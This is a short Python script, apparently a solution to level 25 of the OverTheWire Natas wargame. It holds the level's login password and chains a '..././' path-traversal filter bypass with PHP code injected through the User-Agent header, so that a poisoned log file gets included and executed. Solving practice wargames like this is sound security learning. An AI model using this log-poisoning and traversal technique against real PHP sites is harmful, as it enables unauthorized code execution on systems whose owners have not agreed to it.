import requests
import string
import time

username = 'natas25'
password = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'

url = 'http://{}.natas.labs.overthewire.org'.format(username)

with requests.Session() as session:
    session.get(url, auth = (username, password))
    session_id = session.cookies['PHPSESSID']
    headers = {
        'User-Agent': '<?php echo(\'Hi\') ?>'
    }
    print(session_id)
    target = "{}/?lang=..././..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_{}.log".format(url, session_id)
    print(session.get(target, auth = (username, password), headers = headers).content)
